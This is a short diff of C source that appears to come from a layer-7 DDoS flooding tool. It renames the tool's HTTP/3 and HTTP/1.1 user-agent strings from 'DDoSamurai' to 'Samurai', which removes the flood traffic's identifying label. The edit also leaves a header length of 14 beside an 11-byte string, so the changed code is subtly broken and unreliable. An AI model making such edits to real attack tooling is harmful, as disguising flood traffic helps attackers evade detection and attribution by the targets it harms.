@@ -1649,7 +1649,7 @@ static int _quic_native_submit_request_stream(
     nva[3].valuelen = authority_len;
     nva[3].flags = NGHTTP3_NV_FLAG_NONE;
     nva[4].name = (uint8_t *)"user-agent";
-    nva[4].value = (uint8_t *)"DDoSamurai/2.0";
+    nva[4].value = (uint8_t *)"Samurai/2.0";
     nva[4].namelen = 10;
     nva[4].valuelen = 14;
     nva[4].flags = NGHTTP3_NV_FLAG_NONE;
@@ -2873,7 +2873,7 @@ static int _build_request(
             "Connection: Upgrade\r\n"
             "Sec-WebSocket-Key: %s\r\n"
             "Sec-WebSocket-Version: 13\r\n"
-            "User-Agent: DDoSamurai-L7/1.0\r\n"
+            "User-Agent: Samurai-L7/1.0\r\n"
             "\r\n",
             path,
             target_ip,
@@ -2890,7 +2890,7 @@ static int _build_request(
             "%s %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "Connection: close\r\n"
-            "User-Agent: DDoSamurai-L7/1.0\r\n"
+            "User-Agent: Samurai-L7/1.0\r\n"
             "\r\n",
             http_method,
             path,
